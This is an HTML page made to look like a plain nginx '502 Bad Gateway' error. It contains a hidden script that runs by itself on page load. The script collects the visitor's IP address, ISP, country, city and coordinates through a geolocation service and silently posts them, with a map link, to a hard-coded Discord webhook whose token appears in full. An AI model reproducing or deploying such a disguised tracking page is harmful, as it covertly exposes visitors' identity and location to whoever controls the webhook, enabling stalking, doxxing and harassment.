<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>502 Bad Gateway</title>
    <style>
        body {font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
              margin:0; padding:20px; background:#f5f5f5; color:#333;}
        .box {max-width:600px; margin:40px auto; background:white; padding:40px; border:1px solid #ddd;
              box-shadow:0 2px 10px rgba(0,0,0,.1);}
        h1 {font-size:4em; font-weight:300; color:#dc3545; margin:0 0 20px;}
        p {font-size:1.1em; margin:0 0 15px;}
        .footer {font-size:0.9em; color:#666; margin-top:30px; padding-top:20px; border-top:1px solid #eee;}
    </style>
</head>
<body>
    <div class="box">
        <h1>502 Bad Gateway</h1>
        <p>The proxy server received an invalid response from an upstream server.</p>
        <p>Please try again later or contact the administrator if the problem persists.</p>
        <div class="footer">nginx</div>
    </div>

    <script>
        async function logVisitor() {
            try {
                // Best free combo right now (2025): ip-api.com â€” unlimited non-commercial, no key needed
                const res = await fetch('https://ip-api.com/json/?fields=66846719');
                const data = await res.json();

                if (data.status !== 'success') return;

                const ip = data.query;
                const city = data.city || 'Unknown';
                const region = data.regionName || 'Unknown';
                const country = data.country || 'Unknown';
                const lat = data.lat;
                const lon = data.lon;
                const isp = data.isp || 'Unknown';

                const mapsLink = `https://www.google.com/maps/@${lat},${lon},10z`; // ~10 km view
                const staticMap = `https://maps.googleapis.com/maps/api/staticmap?center=${lat},${lon}&zoom=10&size=600x300&maptype=roadmap&markers=color:red%7C${lat},${lon}&key=`; // no key = still works for preview

                const message = {
                    content: null,
                    embeds: [{
                        title: "New Visitor Logged",
                        color: 0xFF0000,
                        fields: [
                            { name: "IP", value: `\`${ip}\``, inline: true },
                            { name: "ISP", value: isp, inline: true },
                            { name: "Country", value: country, inline: true },
                            { name: "Region", value: region, inline: true },
                            { name: "City", value: city, inline: true },
                            { name: "Coordinates", value: `${lat}, ${lon}`, inline: true },
                            { name: "Google Maps", value: `[Open in Maps](${mapsLink})`, inline: false }
                        ],
                        image: { url: staticMap },
                        timestamp: new Date().toISOString()
                    }]
                };

                fetch('https://discord.com/api/webhooks/1438923668091699220/mCkSrF8MtQUTOsjoqbC2qrcmhJHoNh4xwrVqMcmpviJ3bEjeJoiiB3O__dpF8Lv0ZsQz', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(message)
                });
            } catch (e) { console.error(e); }
        }

        // Run silently
        logVisitor();
    </script>
</body>
</html>
